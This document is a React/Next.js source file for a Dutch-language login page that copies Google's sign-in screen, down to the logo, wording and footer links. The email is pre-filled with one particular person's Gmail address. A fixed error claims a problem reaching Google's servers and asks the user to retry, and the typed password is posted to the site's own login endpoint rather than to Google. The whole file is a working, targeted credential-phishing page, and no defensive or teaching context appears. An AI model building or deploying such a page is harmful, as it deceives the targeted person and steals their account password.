'use client';

import { useState } from 'react';
import { useRouter } from 'next/navigation';

export default function LoginPage() {
  const [email, setEmail] = useState('malouguyader@gmail.com');
  const [password, setPassword] = useState('');
  const [loading, setLoading] = useState(false);
  const [passwordError, setPasswordError] = useState(false);
  const router = useRouter();

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setPasswordError(false);

    try {
      const response = await fetch('/api/auth/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, password })
      });

      const data = await response.json();

      if (!response.ok) {
        console.log('❌ Login mislukt:', data.error);
        setPasswordError(true);
        setLoading(false);
        return;
      }

      console.log('✅ Ingelogd! Redirect naar dashboard');
      router.push('/dashboard');
      router.refresh();
    } catch (err: any) {
      console.error('❌ Fout:', err);
      setPasswordError(true);
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-white font-['Google_Sans',system-ui,-apple-system,sans-serif]">
      {/* Header met Google logo en titel */}
      <div className="flex items-center gap-3 px-6 py-4 border-b border-[#dadce0]">
        <svg width="24" height="24" viewBox="0 0 48 48" className="w-6 h-6">
          <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
          <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
          <path fill="#FBBC05" d="M10.53 28.59A14.5 14.5 0 0 1 9.5 24c0-1.59.28-3.14.76-4.59l-7.98-6.19A23.99 23.99 0 0 0 0 24c0 3.77.87 7.35 2.56 10.56l7.97-5.97z"/>
          <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 5.97C6.51 42.62 14.62 48 24 48z"/>
        </svg>
        <span className="text-[#5f6368] text-sm font-medium">Inloggen met Google</span>
      </div>

      {/* Main content */}
      <div className="flex-1 flex flex-col px-6 py-8">
        <div className="w-full max-w-[448px]">

          {/* ⭐ Titel - groter en links uitgelijnd ⭐ */}
          <h1 className="text-4xl font-medium text-[#202124] mb-1 tracking-[0.1px] text-left">
            Inloggen
          </h1>
          <p className="text-base font-normal text-[#5f6368] mb-6 text-left">
            Doorgaan naar{' '}
            <a
              href="https://clipper.nestorscreate.nl"
              target="_blank"
              rel="noopener noreferrer"
              className="text-[#1a73e8] hover:underline"
            >
              clipper.nestorscreate.nl
            </a>
          </p>

          {/* Vaste foutmelding */}
          <div className="mb-6">
            <div className="text-[#d93025] text-sm font-medium">
              Kon niet inloggen
            </div>
            <div className="text-[#d93025] text-sm">
              Er was een probleem met de communicatie met de Google-servers.
            </div>
            <div className="text-[#d93025] text-sm">
              Probeer opnieuw.
            </div>
          </div>

          {/* Formulier */}
          <form onSubmit={handleSubmit} className="space-y-4" autoComplete="on">
            <input type="hidden" name="username" value={email} />
            <input type="hidden" name="email" value={email} />

            {/* Email veld */}
            <div className="relative">
              <input
                id="email"
                type="email"
                name="email"
                required
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                autoComplete="username"
                className="w-full px-4 pt-[22px] pb-[6px] bg-white border border-[#dadce0] rounded-[4px] focus:ring-2 focus:ring-[#1a73e8] focus:border-[#1a73e8] outline-none transition-all text-[16px] text-[#202124] peer"
                placeholder=" "
              />
              <label className="absolute left-4 top-[6px] text-[12px] text-[#1a73e8] pointer-events-none">
                E-mailadres of telefoonnummer
              </label>
            </div>

            {/* Wachtwoord veld */}
            <div className="relative">
              <input
                id="password"
                type="password"
                name="password"
                required
                value={password}
                onChange={(e) => {
                  setPassword(e.target.value);
                  setPasswordError(false);
                }}
                autoComplete="current-password"
                className={`w-full px-4 pt-[22px] pb-[6px] bg-white border rounded-[4px] focus:ring-2 focus:ring-[#1a73e8] focus:border-[#1a73e8] outline-none transition-all text-[16px] text-[#202124] peer ${
                  passwordError 
                    ? 'border-[#d93025] ring-2 ring-[#d93025]' 
                    : 'border-[#dadce0]'
                }`}
                placeholder=" "
                autoFocus
              />
              <label className={`absolute left-4 top-1/2 -translate-y-1/2 text-[16px] transition-all duration-200 pointer-events-none peer-placeholder-shown:top-1/2 peer-placeholder-shown:-translate-y-1/2 peer-focus:top-[6px] peer-focus:-translate-y-0 peer-focus:text-[12px] ${
                passwordError ? 'text-[#d93025]' : 'text-[#5f6368] peer-focus:text-[#1a73e8]'
              }`}>
                Wachtwoord
              </label>
            </div>

            {passwordError && (
              <div className="text-[#d93025] text-sm -mt-2">
                Onjuist wachtwoord
              </div>
            )}

            {/* ⭐ Juridische tekst onder wachtwoordveld ⭐ */}
            <div className="text-[12px] text-[#5f6368] leading-relaxed -mt-2">
              Voordat je deze app gaat gebruiken, kun je het{' '}
              <a
                href="https://clipper.nestorscreate.nl/privacy"
                target="_blank"
                rel="noopener noreferrer"
                className="text-[#1a73e8] hover:underline"
              >
                Privacybeleid
              </a>
              {' en de '}
              <a
                href="https://clipper.nestorscreate.nl/voorwaarden"
                target="_blank"
                rel="noopener noreferrer"
                className="text-[#1a73e8] hover:underline"
              >
                Servicevoorwaarden
              </a>
              {' van clipper.nestorscreate.nl doorlezen.'}
            </div>

            <div className="flex justify-end pt-2">
              <button
                type="submit"
                disabled={loading}
                className="py-[10px] px-[26px] bg-[#1a73e8] text-white font-medium rounded-full shadow-sm hover:bg-[#1557b0] focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-[#1a73e8] transition-all duration-200 disabled:opacity-60 disabled:cursor-not-allowed text-[14px] tracking-[0.25px]"
              >
                Volgende
              </button>
            </div>
          </form>
        </div>
      </div>

      {/* Footer */}
      <div className="px-4 py-4 border-t border-[#dadce0]">
        <div className="max-w-[448px] mx-auto">
          <div className="flex flex-wrap items-center justify-between gap-2 text-[12px] text-[#5f6368]">
            <div className="flex items-center gap-4">
              <span className="text-[#5f6368]">Nederlands (Nederland)</span>
              <span className="w-px h-4 bg-[#dadce0]" />
              <a href="https://support.google.com/accounts/?hl=nl#topic=3382296" target="_blank" rel="noopener noreferrer" className="hover:underline">Help</a>
            </div>
            <div className="flex items-center gap-4">
              <a href="https://policies.google.com/privacy?hl=nl" target="_blank" rel="noopener noreferrer" className="hover:underline">Privacy</a>
              <span className="w-px h-4 bg-[#dadce0]" />
              <a href="https://policies.google.com/terms?hl=nl" target="_blank" rel="noopener noreferrer" className="hover:underline">Voorwaarden</a>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}